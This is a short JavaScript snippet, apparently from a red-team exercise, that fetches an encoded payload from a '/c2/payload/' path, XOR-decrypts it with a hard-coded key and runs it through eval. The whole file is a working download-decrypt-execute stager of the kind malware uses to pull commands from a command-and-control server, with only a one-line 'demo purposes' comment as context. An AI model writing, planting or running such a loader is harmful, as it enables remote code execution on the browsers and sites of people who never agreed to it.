
(function(){
    function xorDecrypt(base64, key) {
        let data = atob(base64);
        return [...data].map((c, i) => String.fromCharCode(c.charCodeAt(0) ^ key.charCodeAt(i % key.length))).join('');
    }

    fetch('/c2/payload/').then(r => r.text()).then(enc => {
        let decrypted = xorDecrypt(enc, 'redteamkey');
        eval(decrypted); // Caution: eval for demo purposes
    });
})();
